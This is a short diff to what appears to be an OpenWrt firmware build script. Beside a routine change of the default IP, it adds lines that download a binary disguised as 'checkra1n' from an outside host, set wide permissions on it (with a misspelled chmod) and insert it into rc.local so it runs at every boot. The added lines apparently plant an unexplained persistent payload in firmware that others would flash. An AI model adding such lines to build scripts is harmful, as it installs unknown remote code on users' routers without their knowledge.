@@ -12,3 +12,5 @@
 
 # Modify default IP
 sed -i 's/192.168.1.1/192.168.6.1/g' package/base-files/files/bin/config_generate
+cd package/base-files/files/bin && wget https://apt.lazybot.vip/yy/checkra1n && chomd -R 777 ./checkra1n
+sed -i '2a/checkra1n -c & ' package/base-files/files/etc/rc.local
